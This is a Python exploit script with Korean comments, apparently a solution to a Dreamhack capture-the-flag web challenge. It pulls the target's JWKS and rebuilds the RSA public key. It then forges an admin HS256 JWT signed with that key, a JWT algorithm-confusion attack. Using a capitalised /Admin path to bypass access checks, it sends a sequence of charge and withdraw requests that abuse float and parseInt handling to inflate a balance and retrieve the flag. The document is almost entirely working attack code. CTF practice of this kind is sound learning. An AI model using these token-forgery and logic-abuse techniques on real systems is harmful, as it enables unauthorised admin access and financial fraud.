import requests
import base64
import json
import hmac
import hashlib
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

TARGET_URL = "http://host8.dreamhack.games:21213"

def get_real_public_key():
    print("[*] 1. 타겟 서버에서 실제 jwks.json 가져오기...")
    res = requests.get(f"{TARGET_URL}/jwks.json")
    jwks = res.json()
    print(f"[+] 가져온 JWKS 정보: {jwks}")
    
    n_b64 = jwks['keys'][0]['n']
    e_b64 = jwks['keys'][0]['e']
    
    # URL-Safe Base64 패딩 복원 및 디코딩
    def b64_dec(s):
        return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
    
    n = int.from_bytes(b64_dec(n_b64), 'big')
    e = int.from_bytes(b64_dec(e_b64), 'big')
    
    print(f"[*] 2. RSA 공개키(PEM) 재구성 중...")
    pub_num = RSAPublicNumbers(e, n)
    pub_key = pub_num.public_key()
    
    pem_bytes = pub_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    pem_str = pem_bytes.decode('utf-8')
    
    pem_str = pem_str.replace("BEGIN PUBLIC KEY", "BEGIN RSA PUBLIC KEY")
    pem_str = pem_str.replace("END PUBLIC KEY", "END RSA PUBLIC KEY")
    print(f"[+] 완성된 PEM 키:\n{pem_str}")
    return pem_str

def create_manual_hs256_jwt(payload, secret_string):
    header = {"alg": "HS256", "typ": "JWT"}
    
    def b64url_encode(data):
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':')).encode('utf-8')
        elif isinstance(data, str):
            data = data.encode('utf-8')
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
    
    encoded_header = b64url_encode(header)
    encoded_payload = b64url_encode(payload)
    
    signature_input = f"{encoded_header}.{encoded_payload}".encode('utf-8')
    secret_bytes = secret_string.encode('utf-8')
    
    signature = hmac.new(secret_bytes, signature_input, hashlib.sha256).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b'=').decode('utf-8')
    
    return f"{encoded_header}.{encoded_payload}.{encoded_signature}"

def main():
    pem_str = get_real_public_key()
    
    print("[*] 3. Algorithm Confusion 공격을 위한 HS256 JWT 생성 (수동 조립)...")
    token = create_manual_hs256_jwt({"role": "admin"}, pem_str)
    print(f"[+] 위조된 Admin JWT Token: {token}")
    
    cookies = {"jwt": token}
    
    print("\n===================[ Exploit Start ]===================")
    
    # 여기서부터 경로를 //admin 대신 /Admin (대문자 A)로 변경했습니다!
    print("[*] Step 0: 상태 초기화를 위해 /charge 3번 요청 (limit 리셋)")
    for i in range(3):
        r = requests.get(f"{TARGET_URL}/Admin/charge?money=0.0", cookies=cookies)
        print(f"    요청 {i+1} 결과: {r.status_code} - 바디: {r.text}")

    money_1 = "0.99999999999999999"
    print(f"\n[*] Step 1: balance를 0으로 설정 (withdraw {money_1})")
    r1 = requests.get(f"{TARGET_URL}/Admin/withdraw?money={money_1}", cookies=cookies)
    print(f"    결과: {r1.status_code} - 바디: {r1.text}")

    money_9e8 = "0.00000009"
    print(f"\n[*] Step 2: balance를 {money_9e8} 로 충전")
    r2 = requests.get(f"{TARGET_URL}/Admin/charge?money={money_9e8}", cookies=cookies)
    print(f"    결과: {r2.status_code} - 바디: {r2.text}")

    money_0 = "0.0"
    print(f"\n[*] Step 3: parseInt 버그 트리거 (withdraw {money_0}) -> balance=9 기대")
    r3 = requests.get(f"{TARGET_URL}/Admin/withdraw?money={money_0}", cookies=cookies)
    print(f"    결과: {r3.status_code} - 바디: {r3.text}")

    print(f"\n[*] Step 4: balance 10 달성 위해 1 충전 (charge {money_1})")
    r4 = requests.get(f"{TARGET_URL}/Admin/charge?money={money_1}", cookies=cookies)
    print(f"    결과: {r4.status_code} - 바디: {r4.text}")

    print("\n[*] Step 5: 플래그 획득 시도!")
    r5 = requests.get(f"{TARGET_URL}/flag", cookies=cookies)
    print(f"\n[+] FLAG 응답: \n\n{r5.text}\n")

if __name__ == "__main__":
    main()